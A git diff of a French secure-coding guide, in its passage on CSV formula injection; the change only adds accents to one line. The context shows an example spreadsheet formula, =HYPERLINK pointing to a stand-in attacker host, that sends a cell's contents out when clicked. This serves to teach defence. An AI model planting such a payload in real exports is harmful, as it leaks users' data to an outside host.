@@ -67,7 +67,7 @@ Le nom vient de l'idée d'un fichier qui "glisse" (*slip*) hors du dossier cible
 Un fichier `.csv` généré par l'application (export de données, rapport) et destiné à être ouvert dans un tableur (Excel, Google Sheets) porte un risque propre à ce format de destination : le tableur interprète toute cellule commençant par `=`, `+`, `-` ou `@` comme une FORMULE à calculer, pas comme du texte brut.
 
 ```text
-Donnee utilisateur stockee telle quelle : =HYPERLINK("http://attaquant.example/vol?c="&A1;"Cliquez ici")
+Donnée utilisateur stockée telle quelle : =HYPERLINK("http://attaquant.example/vol?c="&A1;"Cliquez ici")
 
 Export CSV du champ :  =HYPERLINK("http://attaquant.example/vol?c="&A1;"Cliquez ici")
 
